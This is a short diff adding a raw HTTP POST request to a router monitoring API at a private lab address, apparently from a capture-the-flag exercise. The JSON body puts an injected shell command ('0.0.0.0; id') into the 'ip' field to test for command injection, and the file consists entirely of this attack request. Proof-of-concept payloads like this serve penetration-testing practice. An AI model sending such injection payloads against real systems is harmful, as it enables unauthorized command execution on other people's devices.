@@ -1,0 +1,12 @@
+POST /api/v4/monitoring/router/dev/check/deviceAccess HTTP/1.1
+Host: 10.10.11.148
+Accept: */*
+User-Agent: RouterSpaceAgent
+Content-Type: application/json
+Content-Length: 32
+Connection: close
+
+{
+	"ip":"0.0.0.0; id"
+}
+
